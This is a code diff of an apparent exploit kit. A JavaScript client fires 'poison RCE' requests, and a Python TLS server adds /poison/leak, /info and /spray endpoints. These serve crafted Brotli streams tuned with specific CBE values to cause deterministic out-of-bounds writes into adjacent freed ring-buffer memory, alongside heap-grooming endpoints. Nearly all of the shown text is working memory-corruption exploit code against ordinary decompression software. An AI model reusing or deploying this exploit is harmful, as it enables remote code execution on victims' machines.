@@ -545,12 +545,12 @@ async function firePoison() {
     // Small delay for allocator to process frees
     await new Promise(r => setTimeout(r, 200));
 
-    log('[*] Phase 3: Firing poison RCE stream on /rce/marker ...', 'info');
-    log('[*] This triggers OOB write into adjacent freed ring buffer slot', 'info');
+    log('[*] Phase 3: Firing poison RCE stream on /poison/leak ...', 'info');
+    log('[*] This triggers deterministic OOB (cbe=0x003F0F, block_length=32768)', 'info');
 
     // Fire the poison stream — the OOB write targets adjacent memory
     try {
-        let poisonResp = await fetch(SERVER + '/rce/marker');
+        let poisonResp = await fetch(SERVER + '/poison/leak');
         let poisonText = await poisonResp.text();
         log('[+] Poison response received: ' + poisonText.length + ' chars', 'ok');
         if (poisonText.length > 0) {
@@ -803,6 +803,51 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
                 return
 
             _send_br_response(ssl_sock, payload)
+
+        # --- Optimized poison endpoints (small CBE for deterministic OOB) ---
+        elif path.startswith("/poison/"):
+            parts = path.split("/")
+            variant = parts[2] if len(parts) > 2 else ""
+
+            if variant == "leak":
+                # Small CBE for deterministic block exhaustion
+                # cbe=0x003F0F → block_length=32768, OOB starts at rb_pos=0
+                # After 32768 commands (128KB), writes start hitting adjacent memory
+                prefix = bytearray(1024)
+                for i in range(0, 1024, 4):
+                    struct.pack_into("<I", prefix, i, 0xDEADBEEF)
+                payload = build_rce_stream(bytes(prefix), 0x003F0F)
+                print(f"  -> POISON/LEAK: 1KB DEADBEEF, cbe=0x003F0F, total={len(payload)}B")
+                _send_br_response(ssl_sock, payload)
+
+            elif variant == "info":
+                # Minimal OOB — just enough to corrupt adjacent ring buffer
+                # cbe=0x000000 → block_length=16625, only 66500 bytes before OOB
+                prefix = bytearray(1024)
+                for i in range(0, 1024, 8):
+                    struct.pack_into("<Q", prefix, i, 0x4141414141414141)
+                payload = build_rce_stream(bytes(prefix), 0x000000)
+                print(f"  -> POISON/INFO: 1KB pattern, cbe=0x0, total={len(payload)}B")
+                _send_br_response(ssl_sock, payload)
+
+            elif variant == "spray":
+                # Medium CBE for more wraps through ring buffer before OOB
+                # cbe=0x010000 → ~328KB written, 2 wraps
+                prefix = bytearray(1024)
+                for i in range(0, 1024, 4):
+                    struct.pack_into("<I", prefix, i, 0xCAFEBABE)
+                payload = build_rce_stream(bytes(prefix), 0x010000)
+                print(f"  -> POISON/SPRAY: 1KB CAFEBABE, cbe=0x10000, total={len(payload)}B")
+                _send_br_response(ssl_sock, payload)
+
+            else:
+                body = b"404 Unknown poison variant. Try: leak, info, spray\n"
+                ssl_sock.sendall(
+                    b"HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\n"
+                    + f"Content-Length: {len(body)}\r\n".encode()
+                    + b"Connection: close\r\n\r\n" + body
+                )
+                return
 
         # --- Heap spray grooming endpoints ---
         elif path == "/groom/landing":
